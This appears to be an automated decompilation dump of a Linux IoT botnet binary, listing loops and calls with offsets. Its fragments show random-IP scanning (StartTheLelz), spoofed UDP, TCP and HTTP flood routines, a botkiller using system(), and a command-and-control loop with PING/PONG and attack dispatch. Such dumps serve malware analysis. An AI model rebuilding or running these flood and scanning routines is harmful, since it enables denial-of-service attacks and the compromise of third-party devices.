++++++++ FUNCTION LENGTH 217
    return _stdio_fopen(0, (char *)-1);
=================FUNCTION : __GI_getsockname ===================
++++++++ FUNCTION START 48686
++++++++ FUNCTION END 48902
++++++++ FUNCTION LENGTH 216
    return __socketcall(6, (int32_t)&a1);
=================FUNCTION : rawmemchr ===================
++++++++ FUNCTION START 76915
++++++++ FUNCTION END 77215
++++++++ FUNCTION LENGTH 300
    while (true) {
================================================================================
========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
================================================================================
=============================WHILE LOOPS ID : 1 @ trim ====================================
++++++++ WHILE START : 2503 
++++++++ WHILE FUNCTION : trim 
++++++++ WHILE END : 2563 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 2 @ prints ====================================
++++++++ WHILE START : 3035 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 3046 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v217);
=============================WHILE LOOPS ID : 3 @ prints ====================================
++++++++ WHILE START : 3181 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 3192 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v217);
=============================WHILE LOOPS ID : 4 @ prints ====================================
++++++++ WHILE START : 3334 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 3345 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v217);
=============================WHILE LOOPS ID : 6 @ print ====================================
++++++++ WHILE START : 4016 
++++++++ WHILE FUNCTION : print 
++++++++ WHILE END : 4331 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(a1, (int32_t)*v220);
		while (true) {
		while (true) {
		result2 = prints(v216, v240, v229, v225) + result;
		int32_t v243 = printi(v216, v242, 10, 1, v229, v225, 97) + result; // 0x10000cb0
		int32_t v245 = printi(v216, v244, 16, 0, v229, v225, 97) + result; // 0x10000d64
		int32_t v247 = printi(v216, v246, 16, 0, v229, v225, 65) + result; // 0x10000e18
		int32_t v249 = printi(v216, v248, 10, 0, v229, v225, 97) + result; // 0x10000ecc
		int32_t v251 = prints(v216, (char *)&v219, v229, v225); // 0x10000f7c
		printchar(a1, (int32_t)*v220);
=============================WHILE LOOPS ID : 7 @ fdpclose ====================================
++++++++ WHILE START : 5777 
++++++++ WHILE FUNCTION : fdpclose 
++++++++ WHILE END : 5800 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_waitpid(v221, (int32_t)&v220, 0) == -1) {
		__GI_sigprocmask(2, v219, 0);
=============================WHILE LOOPS ID : 10 @ getBogos ====================================
++++++++ WHILE START : 7266 
++++++++ WHILE FUNCTION : getBogos 
++++++++ WHILE END : 7330 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v217, 0x1000, v215) == 0) {
		__libc_close(v215);
		uppercase((char *)&v216);
		if (strstr(v217, "BOGOMIPS", 0x10010000) == v217) {
		while (true) {
		while (true) {
		__libc_close(v215);
=============================WHILE LOOPS ID : 11 @ getCores ====================================
++++++++ WHILE START : 7554 
++++++++ WHILE FUNCTION : getCores 
++++++++ WHILE END : 7573 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v217, 0x1000, v215) == 0) {
		__libc_close(v215);
		uppercase((char *)&v216);
		if (strstr(v217, "BOGOMIPS", 0x10010000) == v217) {
=============================WHILE LOOPS ID : 12 @ recvLine ====================================
++++++++ WHILE START : 8046 
++++++++ WHILE FUNCTION : recvLine 
++++++++ WHILE END : 8140 
++++++++ INTRESTING INSTRUCTIONS :  
		sockprintf(v225, (int32_t)"PING", 0x10010000);
		while (true) {
		while (true) {
		if (__libc_recv(v225, (int32_t)&v231, 1, 0) != 1) {
		while (true) {
=============================WHILE LOOPS ID : 14 @ read_with_timeout ====================================
++++++++ WHILE START : 8833 
++++++++ WHILE FUNCTION : read_with_timeout 
++++++++ WHILE END : 8850 
++++++++ INTRESTING INSTRUCTIONS :  
		return __libc_recv(a1, a3, a4, 0);
=============================WHILE LOOPS ID : 15 @ contains_string ====================================
++++++++ WHILE START : 10194 
++++++++ WHILE FUNCTION : contains_string 
++++++++ WHILE END : 10211 
++++++++ INTRESTING INSTRUCTIONS :  
		if (strcasestr((char *)a1, v218, 4 * v217 + a2) == 0) {
=============================WHILE LOOPS ID : 16 @ connectTimeout ====================================
++++++++ WHILE START : 10469 
++++++++ WHILE FUNCTION : connectTimeout 
++++++++ WHILE END : 10500 
++++++++ INTRESTING INSTRUCTIONS :  
		getsockopt(a1, 1, 4, (int32_t)&v227, (int32_t)&v226);
=============================WHILE LOOPS ID : 17 @ listFork ====================================
++++++++ WHILE START : 10733 
++++++++ WHILE FUNCTION : listFork 
++++++++ WHILE END : 10753 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
=============================WHILE LOOPS ID : 18 @ matchPrompt ====================================
++++++++ WHILE START : 11253 
++++++++ WHILE FUNCTION : matchPrompt 
++++++++ WHILE END : 11314 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 19 @ readUntil ====================================
++++++++ WHILE START : 11541 
++++++++ WHILE FUNCTION : readUntil 
++++++++ WHILE END : 11640 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		int32_t v223 = __libc_recv(a1, v222, 1, 0); // 0x10003038
		if (strstr(a6, (char *)a2, v222) != 0) {
		int32_t v227 = __libc_recv(a1, v222 + 1, 2, 0); // 0x100030a8
=============================WHILE LOOPS ID : 21 @ StartTheLelz ====================================
++++++++ WHILE START : 14888 
++++++++ WHILE FUNCTION : StartTheLelz 
++++++++ WHILE END : 15007 
++++++++ INTRESTING INSTRUCTIONS :  
		GetRandomPublicIP(v229);
		socket(2, 1, 0);
		if (__libc_connect(*v228, (int32_t)&v215, 16) == -1) {
		socket(2, 1, 0);
=============================WHILE LOOPS ID : 26 @ sendSTD ====================================
++++++++ WHILE START : 15285 
++++++++ WHILE FUNCTION : sendSTD 
++++++++ WHILE END : 15308 
++++++++ INTRESTING INSTRUCTIONS :  
		random();
		__libc_send(v215, v226, 65, 0);
		__libc_connect(v215, v219, 16);
		__libc_close(v215);
=============================WHILE LOOPS ID : 27 @ sendUDP ====================================
++++++++ WHILE START : 15563 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 15605 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_sendto(v219, v220, a5, 0, v215, 16, v215);
		rand_cmwc();
=============================WHILE LOOPS ID : 28 @ sendUDP ====================================
++++++++ WHILE START : 15665 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 15720 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_sendto(v226, v231, a5 + 28, 0, v215, 16, v215);
		*v232 = (int16_t)rand_cmwc();
		v247 = rand_cmwc();
		*(int16_t *)(v231 | 4) = (int16_t)rand_cmwc();
		*(int32_t *)(v231 | 12) = htonl(GetRandomIP(v229));
=============================WHILE LOOPS ID : 29 @ sendTCP ====================================
++++++++ WHILE START : 16022 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 16106 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__GI_strcoll(v242, (int32_t)"rst") == 0) {
		if (__GI_strcoll(v242, (int32_t)"psh") == 0) {
		sockprintf(v217, (int32_t)"Invalid flag \"%s\"", v241);
=============================WHILE LOOPS ID : 30 @ sendTCP ====================================
++++++++ WHILE START : 16131 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 16161 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v216, v222, v220, 0, v214, 16, v214);
		v231 = GetRandomIP(v219);
		*(int16_t *)(v222 | 4) = (int16_t)rand_cmwc();
		*v228 = rand_cmwc();
		*v224 = (int16_t)rand_cmwc();
		*v235 = (int16_t)tcpcsum(v222, v234, v223);
=============================WHILE LOOPS ID : 31 @ sendTCP ====================================
++++++++ WHILE START : 16188 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 16204 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v216, v222, v220, 0, v214, 16, v214);
		v231 = GetRandomIP(v219);
		*(int16_t *)(v222 | 4) = (int16_t)rand_cmwc();
		*v228 = rand_cmwc();
		*v224 = (int16_t)rand_cmwc();
		*v235 = (int16_t)tcpcsum(v222, v234, v223);
=============================WHILE LOOPS ID : 32 @ botkiller ====================================
++++++++ WHILE START : 16433 
++++++++ WHILE FUNCTION : botkiller 
++++++++ WHILE END : 16451 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_system(v215);
		__libc_system(v215);
=============================WHILE LOOPS ID : 33 @ sendHTTP ====================================
++++++++ WHILE START : 16907 
++++++++ WHILE FUNCTION : sendHTTP 
++++++++ WHILE END : 16957 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_fork() != 0) {
		while (true) {
		int32_t v223 = socket_connect(a1, a3); // 0x10009f4c
		__libc_close(v224);
=============================WHILE LOOPS ID : 34 @ sendHTTP2 ====================================
++++++++ WHILE START : 17190 
++++++++ WHILE FUNCTION : sendHTTP2 
++++++++ WHILE END : 17243 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v219 = random() % 36; // 0x1000a0a0
		sprintf(v217, (int32_t)"%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", a1, a4, a2, v220, 0x10010000, v219);
		if (__libc_fork() != 0) {
		while (true) {
		int32_t v222 = socket_connect(a2, a3); // 0x1000a11c
		__libc_close(v222);
=============================WHILE LOOPS ID : 35 @ processCmd ====================================
++++++++ WHILE START : 17993 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18010 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendTCP(v219, v260, v261, v262, v263, v221, v222);
=============================WHILE LOOPS ID : 37 @ processCmd ====================================
++++++++ WHILE START : 18122 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18128 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 40 @ processCmd ====================================
++++++++ WHILE START : 18242 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18293 
++++++++ INTRESTING INSTRUCTIONS :  
		sockprintf(v209, (int32_t)"None Killed.", 0x10010000);
		sockprintf(v209, (int32_t)"Killed %d.", v305);
		if (*v310 != __libc_getpid()) {
		kill(v312, 9);
=============================WHILE LOOPS ID : 41 @ processCmd ====================================
++++++++ WHILE START : 18312 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18329 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendSTD(v295, v301, v302);
=============================WHILE LOOPS ID : 45 @ processCmd ====================================
++++++++ WHILE START : 18417 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18435 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendCNC(v285, v291, v292);
		__libc_close(v209);
=============================WHILE LOOPS ID : 47 @ processCmd ====================================
++++++++ WHILE START : 18491 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18497 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 51 @ processCmd ====================================
++++++++ WHILE START : 18612 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18618 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 55 @ processCmd ====================================
++++++++ WHILE START : 18770 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18776 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 58 @ processCmd ====================================
++++++++ WHILE START : 18840 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18846 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 60 @ processCmd ====================================
++++++++ WHILE START : 18897 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18903 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 64 @ processCmd ====================================
++++++++ WHILE START : 19012 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19018 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 67 @ processCmd ====================================
++++++++ WHILE START : 19085 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19104 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendHTTP(v215, v214, (int16_t)v315, v213, v212, atol(*(int32_t *)v241, v241));
=============================WHILE LOOPS ID : 69 @ processCmd ====================================
++++++++ WHILE START : 19198 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19204 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 72 @ processCmd ====================================
++++++++ WHILE START : 19259 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19265 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 73 @ processCmd ====================================
++++++++ WHILE START : 19298 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19304 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 74 @ processCmd ====================================
++++++++ WHILE START : 19353 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19359 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 75 @ processCmd ====================================
++++++++ WHILE START : 19430 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19436 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 76 @ processCmd ====================================
++++++++ WHILE START : 19455 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19461 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 77 @ processCmd ====================================
++++++++ WHILE START : 19494 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19500 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 78 @ processCmd ====================================
++++++++ WHILE START : 19549 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19555 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 79 @ processCmd ====================================
++++++++ WHILE START : 19647 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19653 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 80 @ processCmd ====================================
++++++++ WHILE START : 19672 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19678 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 81 @ processCmd ====================================
++++++++ WHILE START : 19711 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19717 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 82 @ processCmd ====================================
++++++++ WHILE START : 19766 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19772 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 83 @ processCmd ====================================
++++++++ WHILE START : 19843 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19849 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 84 @ processCmd ====================================
++++++++ WHILE START : 19868 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19874 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 85 @ processCmd ====================================
++++++++ WHILE START : 19907 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19913 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 86 @ processCmd ====================================
++++++++ WHILE START : 19962 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19968 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 87 @ processCmd ====================================
++++++++ WHILE START : 20060 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20066 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 88 @ processCmd ====================================
++++++++ WHILE START : 20085 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20091 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 89 @ processCmd ====================================
++++++++ WHILE START : 20124 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20130 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 90 @ processCmd ====================================
++++++++ WHILE START : 20179 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20185 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 91 @ processCmd ====================================
++++++++ WHILE START : 20256 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20262 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 92 @ processCmd ====================================
++++++++ WHILE START : 20281 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20287 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 93 @ processCmd ====================================
++++++++ WHILE START : 20320 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20326 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 94 @ processCmd ====================================
++++++++ WHILE START : 20375 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20381 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 95 @ processCmd ====================================
++++++++ WHILE START : 20470 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20476 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 96 @ processCmd ====================================
++++++++ WHILE START : 20523 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20529 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 97 @ processCmd ====================================
++++++++ WHILE START : 20553 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20559 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 98 @ processCmd ====================================
++++++++ WHILE START : 20614 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20620 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 99 @ processCmd ====================================
++++++++ WHILE START : 20667 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20673 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 100 @ processCmd ====================================
++++++++ WHILE START : 20741 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20747 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 101 @ processCmd ====================================
++++++++ WHILE START : 20794 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20800 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 102 @ processCmd ====================================
++++++++ WHILE START : 20894 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20900 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 103 @ processCmd ====================================
++++++++ WHILE START : 20947 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20953 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 104 @ processCmd ====================================
++++++++ WHILE START : 20977 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20983 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 105 @ processCmd ====================================
++++++++ WHILE START : 21038 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21044 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 106 @ processCmd ====================================
++++++++ WHILE START : 21091 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21097 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 107 @ processCmd ====================================
++++++++ WHILE START : 21165 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21171 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 108 @ processCmd ====================================
++++++++ WHILE START : 21218 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21224 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 109 @ processCmd ====================================
++++++++ WHILE START : 21248 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21265 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendUDP(v220, v248, v249, v250, v251, v217, v223);
=============================WHILE LOOPS ID : 110 @ processCmd ====================================
++++++++ WHILE START : 21370 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21376 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 111 @ processCmd ====================================
++++++++ WHILE START : 21448 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21454 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 112 @ processCmd ====================================
++++++++ WHILE START : 21501 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21507 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 113 @ processCmd ====================================
++++++++ WHILE START : 21531 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21537 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 114 @ processCmd ====================================
++++++++ WHILE START : 21592 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21598 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 115 @ processCmd ====================================
++++++++ WHILE START : 21645 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21651 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 116 @ processCmd ====================================
++++++++ WHILE START : 21719 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21725 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 117 @ processCmd ====================================
++++++++ WHILE START : 21810 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21816 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 118 @ processCmd ====================================
++++++++ WHILE START : 21889 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21895 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 119 @ processCmd ====================================
++++++++ WHILE START : 21986 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21992 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 120 @ processCmd ====================================
++++++++ WHILE START : 22051 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22057 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 121 @ processCmd ====================================
++++++++ WHILE START : 22187 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22193 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 122 @ processCmd ====================================
++++++++ WHILE START : 22441 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22447 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 123 @ processCmd ====================================
++++++++ WHILE START : 22506 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22512 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 124 @ processCmd ====================================
++++++++ WHILE START : 22614 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22620 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 125 @ processCmd ====================================
++++++++ WHILE START : 22635 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22641 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 126 @ processCmd ====================================
++++++++ WHILE START : 22745 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22751 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 127 @ processCmd ====================================
++++++++ WHILE START : 22781 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22787 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 128 @ processCmd ====================================
++++++++ WHILE START : 22830 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22836 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 129 @ processCmd ====================================
++++++++ WHILE START : 22851 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22857 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 130 @ processCmd ====================================
++++++++ WHILE START : 22948 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22954 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 131 @ processCmd ====================================
++++++++ WHILE START : 22984 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22990 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 132 @ processCmd ====================================
++++++++ WHILE START : 23033 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23039 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 133 @ getOurIP ====================================
++++++++ WHILE START : 23565 
++++++++ WHILE FUNCTION : getOurIP 
++++++++ WHILE END : 23672 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v223, 0x1000, v221) != 0) {
		if (strstr(v223, "\t00000000\t", 0x10010000) != 0) {
		__libc_close(v221);
		__libc_close(v215);
		__libc_close(v215);
		__libc_close(v221);
		__libc_close(v215);
		__libc_close(v215);
		__libc_close(v221);
		__libc_close(v215);
		__libc_close(v215);
=============================WHILE LOOPS ID : 134 @ main ====================================
++++++++ WHILE START : 24169 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 24607 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		fgets(v234, 1024, v211);
		if (__GI_strcasecmp(v234, v233) == 0) {
		__GI_fclose((int16_t *)v211);
		int32_t v239 = __GI_fopen((int32_t)v212, (int32_t)&v238); // 0x1000bb10
		__GI_fclose((int16_t *)v239);
		getOurIP();
		v220 = __libc_fork();
		if (__libc_fork() == 0) {
		zprintf((int32_t)"fork failed\n", 0x10010000);
		while (true) {
		if (initConnection() != 0) {
		while (true) {
		if (initConnection() == 0) {
		v244 = getBuild(0x10030000);
		__GI_inet_ntoa(&v243, 0x10030000);
		sockprintf(v241, (int32_t)"BUILD %s:%s", v244);
		while (true) {
		while (true) {
		if (recvLine(v214, (char *)&v215, 0x1000, v224) == -1) {
		while (true) {
		if (__libc_waitpid(v252, 0, 1) >= 1) {
		while (true) {
		while (true) {
		free();
		if (strstr(v224, "PING", 0x10010000) == v224) {
		sockprintf(v214, (int32_t)"PONG", 0x10010000);
		if (strstr(v224, "DUP", 0x10010000) == v224) {
		zprintf((int32_t)"PEACE OUT IMMA DUP\n", 0x10010000);
		while (true) {
		if (initConnection() == 0) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (listFork() == 0) {
		while (true) {
		processCmd(v277, &v230);
		processCmd(v277, &v230);
		while (true) {
		free();
		free();
		while (true) {
		if (__libc_waitpid(v252, 0, 1) < 1) {
		v244 = getBuild(0x10030000);
